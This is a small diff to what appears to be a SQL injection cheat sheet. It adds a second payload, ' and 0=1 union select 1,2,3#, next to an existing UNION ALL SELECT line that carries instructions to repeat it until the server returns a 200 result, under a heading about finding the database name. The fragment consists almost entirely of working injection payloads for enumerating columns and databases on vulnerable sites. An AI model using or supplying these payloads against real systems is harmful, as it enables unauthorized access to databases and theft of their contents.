@@ -4,6 +4,10 @@
 ```
 0 UNION ALL SELECT 1,2,3,...; #               (Do This until you get a 200 service Result)
 ```
+OR
+```
+' and 0=1 union select 1,2,3#
+```
 ___
 `To Find The Database Name`
 ```
